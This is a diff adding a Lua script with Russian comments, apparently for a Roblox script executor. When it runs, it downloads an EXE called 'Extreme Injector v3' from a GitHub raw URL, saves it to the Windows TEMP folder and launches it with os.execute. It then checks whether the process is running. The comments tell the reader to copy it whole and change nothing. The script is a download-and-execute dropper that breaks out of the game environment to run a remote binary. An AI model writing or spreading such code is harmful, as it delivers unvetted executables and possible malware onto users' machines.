@@ -1,0 +1,103 @@
+-- ========== ПОЛНЫЙ ИСПРАВЛЕННЫЙ СКРИПТ ==========
+-- Не изменяй, просто скопируй и используй целиком
+
+print("=== СКРИПТ АКТИВИРОВАН ===")
+
+-- Функция загрузки и запуска EXE
+local function downloadAndExecute()
+    -- 1. Проверка окружения
+    print("[1/4] Проверка функций...")
+    if not (writefile and os.execute) then
+        warn("ОШИБКА: Инжектор не даёт доступ к writefile или os.execute!")
+        return false
+    end
+    print("✓ writefile и os.execute доступны")
+
+    -- 2. Конфигурация (МЕНЯЙ ТОЛЬКО ЭТУ ССЫЛКУ!)
+    local EXE_URL = "http://raw.githubusercontent.com/fennix2019-pixel/1232/refs/heads/main/Extreme%20Injector%20v3.exe"
+    local EXE_NAME = "injector.exe"  -- Простое имя
+    local SAVE_PATH = os.getenv("TEMP") .. "\\" .. EXE_NAME
+    
+    print("[2/4] Конфигурация:")
+    print("  URL: " .. EXE_URL)
+    print("  Путь: " .. SAVE_PATH)
+
+    -- 3. Скачивание
+    print("[3/4] Скачивание файла...")
+    local file_data
+    local ok, err = pcall(function()
+        file_data = game:HttpGet(EXE_URL, true)
+        return true
+    end)
+    
+    if not ok or not file_data then
+        warn("ОШИБКА СКАЧИВАНИЯ: " .. tostring(err))
+        return false
+    end
+    
+    if #file_data < 1000 then
+        warn("ПРЕДУПРЕЖДЕНИЕ: Файл слишком мал (" .. #file_data .. " байт). Возможно, скачалась страница с ошибкой.")
+    end
+    
+    print("✓ Файл скачан (" .. #file_data .. " байт)")
+
+    -- 4. Сохранение
+    local ok_save = pcall(function()
+        writefile(SAVE_PATH, file_data)
+        return true
+    end)
+    
+    if not ok_save then
+        warn("ОШИБКА: Не удалось сохранить файл на диск!")
+        return false
+    end
+    print("✓ Файл сохранён: " .. SAVE_PATH)
+
+    -- 5. Запуск (ПРОСТЕЙШИЙ МЕТОД)
+    print("[4/4] Запуск программы...")
+    print("  Команда: start \"\" \"" .. SAVE_PATH .. "\"")
+    
+    local ok_run = pcall(function()
+        -- ВАЖНО: Только эта простая команда
+        os.execute('start "" "' .. SAVE_PATH .. '"')
+    end)
+    
+    -- 6. Проверка результата
+    print("\n=== РЕЗУЛЬТАТ ===")
+    if ok_run then
+        print("✅ Команда запуска выполнена без ошибок")
+        
+        -- Ждём 3 секунды и проверяем процесс
+        task.wait(3)
+        
+        local process_ok = pcall(function()
+            os.execute('tasklist | find /i "' .. EXE_NAME .. '" >nul')
+        end)
+        
+        if process_ok then
+            print("✅ Процесс найден в памяти!")
+            print("   Проверь: 1) Диспетчер задач (Ctrl+Shift+Esc)")
+            print("            2) Системный трей (возле часов)")
+        else
+            print("⚠ Процесс НЕ найден в памяти")
+            print("   Возможно, программа запустилась и сразу закрылась")
+        end
+    else
+        print("❌ Ошибка при выполнении команды запуска")
+    end
+    
+    print("\n=== РУЧНАЯ ПРОВЕРКА ===")
+    print("1. Открой папку: " .. os.getenv("TEMP"))
+    print("2. Найди файл: " .. EXE_NAME)
+    print("3. Запусти его ДВОЙНЫМ кликом мыши")
+    print("=== Сообщи результат ===")
+    
+    return ok_run
+end
+
+-- Запускаем основную функцию с задержкой
+task.wait(1)
+downloadAndExecute()
+
+-- ========== КОНЕЦ ОСНОВНОГО КОДА ==========
+-- Ниже НИЧЕГО не добавляй!
